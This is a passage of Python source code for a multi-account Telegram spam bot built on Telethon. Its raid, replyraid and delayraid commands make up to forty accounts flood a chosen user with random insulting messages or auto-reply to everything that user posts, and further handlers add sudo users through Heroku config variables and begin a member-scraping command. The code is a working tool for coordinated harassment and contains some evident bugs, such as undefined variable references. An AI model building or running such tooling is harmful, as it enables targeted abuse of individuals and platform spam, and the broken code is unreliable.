@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%sraid(?: |$)(.*)" % hl))
async def raid(e):
    usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗥𝗮𝗶𝗱\n\nCommand:\n\n{hl}raid <count> <Username of User>\n\n{hl}raid <count> <reply to a User>\n\nCount must be a integer."
    if e.sender_id in SUDO_USERS or e.sender_id in DEV:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        RiZoeL = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        bitxh = await e.get_reply_message()
        if len(RiZoeL) == 2:
            user = str(RiZoeL[1])
            if int(e.chat_id) in GROUP:
                return await e.reply("Sorry !! I can't spam here")
            a = await e.client.get_entity(user)
            g = a.id
            if int(g) in RiZoeLX:
                text = f"I can't raid on @RiZoeLX's Owner"
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) == OWNER_ID:
                text = f"This guy is Owner Of this Bots."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in DEV:
                text = f"This guy is a Full sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in SUDO_USERS:
                text = f"This guy is a sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            else:
                c = a.first_name
                username = f"[{c}](tg://user?id={g})"
                counter = int(RiZoeL[0])
                for _ in range(counter):
                    reply = random.choice(RAID)
                    caption = f"{username} {reply}"
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.3)
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            if int(e.chat_id) in GROUP:
                return await e.reply("Sorry !! I can't spam here")
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            if int(g) in RiZoeLX:
                text = f"I can't raid on @RiZoeLX's Owner"
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) == OWNER_ID:
                text = f"This guy is Owner Of this Bots."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in DEV:
                text = f"This guy is a Full sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(g) in SUDO_USERS:
                text = f"This guy is a sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            else:
                c = b.first_name
                counter = int(RiZoeL[0])
                username = f"[{c}](tg://user?id={g})"
                for _ in range(counter):
                    reply = random.choice(RAID)
                    caption = f"{username} {reply}"
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.3)
        else:
            await e.reply(usage)

@Riz.on(events.NewMessage(incoming=True))
@Riz2.on(events.NewMessage(incoming=True))
@Riz3.on(events.NewMessage(incoming=True))
@Riz4.on(events.NewMessage(incoming=True))
@Riz5.on(events.NewMessage(incoming=True))
@Riz6.on(events.NewMessage(incoming=True))
@Riz7.on(events.NewMessage(incoming=True))
@Riz8.on(events.NewMessage(incoming=True))
@Riz9.on(events.NewMessage(incoming=True))
@Riz10.on(events.NewMessage(incoming=True))
@Riz11.on(events.NewMessage(incoming=True))
@Riz12.on(events.NewMessage(incoming=True))
@Riz13.on(events.NewMessage(incoming=True))
@Riz14.on(events.NewMessage(incoming=True))
@Riz15.on(events.NewMessage(incoming=True))
@Riz16.on(events.NewMessage(incoming=True))
@Riz17.on(events.NewMessage(incoming=True))
@Riz18.on(events.NewMessage(incoming=True))
@Riz19.on(events.NewMessage(incoming=True))
@Riz20.on(events.NewMessage(incoming=True))
@Riz21.on(events.NewMessage(incoming=True))
@Riz22.on(events.NewMessage(incoming=True))
@Riz23.on(events.NewMessage(incoming=True))
@Riz24.on(events.NewMessage(incoming=True))
@Riz25.on(events.NewMessage(incoming=True))
@Riz26.on(events.NewMessage(incoming=True))
@Riz27.on(events.NewMessage(incoming=True))
@Riz28.on(events.NewMessage(incoming=True))
@Riz29.on(events.NewMessage(incoming=True))
@Riz30.on(events.NewMessage(incoming=True))
@Riz31.on(events.NewMessage(incoming=True))
@Riz32.on(events.NewMessage(incoming=True))
@Riz33.on(events.NewMessage(incoming=True))
@Riz34.on(events.NewMessage(incoming=True))
@Riz35.on(events.NewMessage(incoming=True))
@Riz36.on(events.NewMessage(incoming=True))
@Riz37.on(events.NewMessage(incoming=True))
@Riz38.on(events.NewMessage(incoming=True))
@Riz39.on(events.NewMessage(incoming=True))
@Riz40.on(events.NewMessage(incoming=True))
async def _(event):
    global que
    queue = que.get(event.sender_id)
    if not queue:
        return
    if int(event.chat_id) in GROUP:
           return
    async with event.client.action(event.chat_id, "typing"):
        await asyncio.sleep(0.2)
    async with event.client.action(event.chat_id, "typing"):
        await event.client.send_message(
            entity=event.chat_id,
            message="""{}""".format(random.choice(REPLYRAID)),
            reply_to=event.message.id,
        )


@Riz.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%sreplyraid(?: |$)(.*)" % hl))
async def replyraid(e):
    global que
    usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱\n\nCommand:\n\n{hl}replyraid <Username of User>\n\n{hl}replyraid <reply to a User>."
    if e.sender_id in SUDO_USERS or e.sender_id in DEV:
        RiZoeL = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        Rizx = await e.get_reply_message()
        if len(e.text) > 11:
            message = str(RiZoeL[0])
            a = await e.client.get_entity(message)
            user_idd = a.id
            user_id = int(user_idd)
            if int(user_id) in RiZoeLX:
                text = f" can't raid on @RiZoeLX's Owner."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(user_id) == OWNER_ID:
                text = f"This guy is Owner Of this Bots."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(user_id) in DEV:
                text = f"This guy is a Full sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(user_id) in SUDO_USERS:
                text = f"This guy is a sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            else:
                que[user_id] = []
                nobi = que.get(user_id)
                nobita = [user_id]
                nobi.append(nobita)
                text = f"Activated replyraid 🔥"
                await e.reply(text, parse_mode=None, link_preview=None )
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            umser = await e.client.get_entity(a.sender_id)
            user_idd = umser.id
            user_id = int(user_idd)
            if int(user_id) in RiZoeLX:
                text = f" can't raid on @RiZoeLX's Owner."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(user_id) == OWNER_ID:
                text = f"This guy is Owner Of this Bots."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(user_id) in DEV:
                text = f"This guy is a Full sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            elif int(user_id) in SUDO_USERS:
                text = f"This guy is a sudo user."
                await e.reply(text, parse_mode=None, link_preview=None )
            else:
                que[user_id] = []
                nobi = que.get(user_id)
                nobita = [user_id]
                nobi.append(nobita)
                text = f"Activated Replyraid"
                await e.reply(text, parse_mode=None, link_preview=None )
        else:
            await e.reply(usage)


@Riz.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%sdreplyraid(?: |$)(.*)" % hl))
async def d_replyraid(e):
    usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗗𝗲𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱\n\nCommand:\n\n{hl}dreplyraid <Username of User>\n\n{hl}dreplyraid <reply to a User>"
    global que    
    if e.sender_id in SUDO_USERS or e.sender_id in DEV:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        Rizoel = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(e.text) > 12:
            message = str(Rizoel[0])
            a = await e.client.get_entity(message)
            g = a.id
            try:
                queue = que.get(g)
                queue.pop(0)
            except Exception as f:
                pass
            text = "De-Activated Reply Raid ☑️"
            await e.reply(text, parse_mode=None, link_preview=None )
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            try:
                queue = que.get(g)
                queue.pop(0)
            except Exception as f:
                pass
            text = "De-Activated Reply Raid"
            await e.reply(text, parse_mode=None, link_preview=None )
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )

@Riz.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%sdelayraid(?: |$)(.*)" % hl))
async def delayraid(event):
   usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗗𝗘𝗟𝗔𝗬𝗥𝗔𝗜𝗗\n\nCommand:\n\n{hl}delayraid <delay> <count> <Username of User>\n\n{hl}delayraid <delay> <count> <reply to a User>\n\nCount must be a integer."        
   if event.sender_id in SUDO_USERS or event.sender_id in DEV:
         if event.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
         RiZoeL = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
         if len(RiZoeL) == 3:
             user = str(RiZoeL[2])
             if int(event.chat_id) in GROUP:
                  return await event.reply("Sorry !! I can't spam here")
             a = await event.client.get_entity(user)
             e = a.id
             if int(e) in RiZoeLX:
                    text = f"I can't raid on @RiZoeLX's Owner"
                    await event.reply(text, parse_mode=None, link_preview=None )
             elif int(e) == OWNER_ID:
                    text = f"This guy is Owner Of this Bots."
                    await e.reply(text, parse_mode=None, link_preview=None )
             elif int(e) in DEV:
                    text = f"This guy is a Full sudo user."
                    await e.reply(text, parse_mode=None, link_preview=None )
             elif int(e) in SUDO_USERS:
                    text = f"This guy is a sudo user."
                    await event.reply(text, parse_mode=None, link_preview=None )
             else:
                 c = a.first_name
                 username = f"[{c}](tg://user?id={e})"
                 counter = int(RiZoeL[1])
                 sleeptimet = sleeptimem = float(RiZoeL[0])
                 for _ in range(counter):
                      reply = random.choice(RAID)
                      caption = f"{username} {reply}"
                      await event.client.send_message(event.chat_id, caption)
                      await asyncio.sleep(sleeptimem)
         elif event.reply_to_msg_id:
               a = await event.get_reply_message()
               if int(event.chat_id) in GROUP:
                  return await event.reply("Sorry !! I can't spam here")
               b = await event.client.get_entity(a.sender_id)
               e = b.id
               if int(e) in RiZoeLX:
                       text = f"I can't raid on @RiZoeLX's Owner"
                       await event.reply(text, parse_mode=None, link_preview=None )
               elif int(e) == OWNER_ID:
                       text = f"This guy is Owner Of this Bots."
                       await e.reply(text, parse_mode=None, link_preview=None )
               elif int(e) in DEV:
                       text = f"This guy is a Full sudo user."
                       await e.reply(text, parse_mode=None, link_preview=None )
               elif int(e) in SUDO_USERS:
                       text = f"This guy is a sudo user."
                       await event.reply(text, parse_mode=None, link_preview=None )
               else:
                   c = b.first_name
                   username = f"[{c}](tg://user?id={e})"
                   sleeptimet = sleeptimem = float(RiZoeL[0])
                   counter = int(RiZoeL[1])
                   for _ in range(counter):
                        reply = random.choice(RAID)
                        caption = f"{username} {reply}"
                        await event.client.send_message(event.chat_id, caption)
                        await asyncio.sleep(sleeptimem)
         else:
            await event.reply(usage)

import heroku3

Heroku = heroku3.from_key(HEROKU_API_KEY)
heroku_api = "https://api.heroku.com"
sudousers = os.environ.get("SUDO_USER", None)
full_sudo = os.environ.get("FULLSUDO", None)
        
@Riz.on(events.NewMessage(incoming=True, pattern=r"\%saddsudo(?: |$)(.*)" % hl))
async def tb(event):
    if event.sender_id == OWNER_ID or e.sender_id in DEV:
        ok = await event.reply("Adding user as a sudo...")
        rizoel = "SUDO_USER"
        if HEROKU_APP_NAME is not None:
            app = Heroku.app(HEROKU_APP_NAME)
        else:
            await ok.edit("`[HEROKU]:" "\nPlease setup your` **HEROKU_APP_NAME**")
            return
        heroku_var = app.config()
        if event is None:
            return
        try:
            target = await get_user(event)
        except Exception:
            await ok.edit(f"Reply to a user.")
        if sudousers:
            newsudo = f"{sudousers} {target}"
        else:
            newsudo = f"{target}"
        await ok.edit(f"**Added `{target}` ** as a sudo user 🔱 Restarting.. Please wait a minute...")
        heroku_var[rizoel] = newsudo

async def get_user(event):
    if event.reply_to_msg_id:
        previous_message = await event.get_reply_message()
        if previous_message.forward:
            replied_user = await event.client(
                GetFullUserRequest(previous_message.forward.sender_id)
            )
        else:
            replied_user = await event.client(
                GetFullUserRequest(previous_message.sender_id)
            )
    target = replied_user.user.id
    return target

@Riz.on(events.NewMessage(incoming=True, pattern=r"\%sfullsudo(?: |$)(.*)" % hl))
async def fs(event):
    if event.sender_id == OWNER_ID:
        ok = await event.reply("Adding user as a sudo...")
        rizoel = "FULLSUDO"
        if HEROKU_APP_NAME is not None:
            app = Heroku.app(HEROKU_APP_NAME)
        else:
            await ok.edit("`[HEROKU]:" "\nPlease setup your` **HEROKU_APP_NAME**")
            return
        heroku_var = app.config()
        if event is None:
            return
        try:
            target = await get_user(event)
        except Exception:
            await ok.edit(f"Reply to a user.")
        if full_sudo:
            newsudo = f"{sudousers} {target}"
        else:
            newsudo = f"{target}"
        await ok.edit(f"**Added `{target}` ** as a full sudo user 🔱 Restarting.. Please wait a minute...")
        heroku_var[rizoel] = newsudo

    if event.sender_id in DEV:
        await event.reply("Only Owner Can Add Full Sudo You Can add Sudo Users Only.")

# Scrape

@Riz.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
